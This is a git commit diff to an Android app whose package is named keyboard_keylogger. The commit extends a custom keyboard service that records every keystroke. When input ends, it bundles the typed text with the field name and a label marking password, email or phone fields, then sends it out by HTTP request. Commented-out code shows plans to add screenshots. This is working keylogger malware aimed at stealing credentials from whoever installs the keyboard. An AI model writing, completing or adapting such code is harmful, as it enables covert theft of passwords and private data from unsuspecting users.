1a1ede4f1cbebae5ee6cf3034e072491d4ce91c1
bpavle <bpavle0@gmail.com>
2022-08-30 17:36:32 +0200

    Adding data to json and get input type

--- app/src/main/java/com/example/keyboard_keylogger/MyService.java
+++ app/src/main/java/com/example/keyboard_keylogger/MyService.java
@@ -6,10 +6,15 @@ import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
 import android.os.Environment;
+import android.text.InputType;
 import android.util.Base64;
 import android.view.KeyEvent;
 import android.view.View;
+import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InputConnection;
+
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -24,16 +29,32 @@ public class MyService extends InputMethodService implements KeyboardView.OnKeyb
     private ArrayList<Character> keyBuffer;
     private boolean isCaps = false;
 
+
     @Override
     public void onFinishInputView(boolean finishingInput) {
 //        String slika = takeScreenshot();
 //        System.out.println(slika);
-        //new HTTPReqTask().setBody(slika).execute();
+//        new HTTPReqTask().setBody(slika).execute();
         //System.out.println("onFinishInputView called");
 //        System.out.println(keyBuffer);
 //        String jsonInputString = "{\"slova\": "+keyBuffer+" }";
 //        new HTTPReqTask().setBody(jsonInputString).execute();
-        new HTTPReqTask().setBody(keyBuffer.toString()).execute();
+        JSONObject obj = new JSONObject();
+        int inputType = getCurrentInputEditorInfo().inputType;
+        String fieldName = getCurrentInputEditorInfo().fieldName;
+        System.out.println(inputType);
+        System.out.println(fieldName);
+
+        String text = getStringRepresentation(keyBuffer);
+        try {
+            obj.put("text",text);
+            obj.put("inputType",determineInputType(inputType));
+            obj.put("fieldName",fieldName);
+//            obj.put("photo",slika);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+        new HTTPReqTask().setBody(obj.toString()).execute();
         keyBuffer.clear();
         super.onFinishInputView(finishingInput);
     }
@@ -62,6 +83,7 @@ public class MyService extends InputMethodService implements KeyboardView.OnKeyb
     @Override
     public void onKey(int i, int[] ints) {
         InputConnection ic = getCurrentInputConnection();
+
         //playClick(i);
 
         keyBuffer.add((char)(i));
@@ -109,6 +131,25 @@ public class MyService extends InputMethodService implements KeyboardView.OnKeyb
 
     }
 
+    private String getStringRepresentation(ArrayList<Character> list)
+    {
+        StringBuilder builder = new StringBuilder(list.size());
+        for(Character ch: list)
+        {
+            builder.append(ch);
+        }
+        return builder.toString();
+    }
+    private String determineInputType(int inputType){
+        if ((inputType & InputType.TYPE_CLASS_PHONE) != 0) return "Phone";
+        if ((inputType & InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS) != 0) return "Email";
+        if ((inputType & InputType.TYPE_TEXT_VARIATION_PASSWORD) != 0) return "Password";
+
+
+
+
+        return "Text";
+    }
 
     private String takeScreenshot() {
         Date now = new Date();
@@ -117,6 +158,7 @@ public class MyService extends InputMethodService implements KeyboardView.OnKeyb
         byte[] byteArray = stream.toByteArray();
         try {
             // create bitmap screen capture
+
             View v1 = this.getWindow().getWindow().getDecorView().getRootView();
 
             v1.setDrawingCacheEnabled(true);
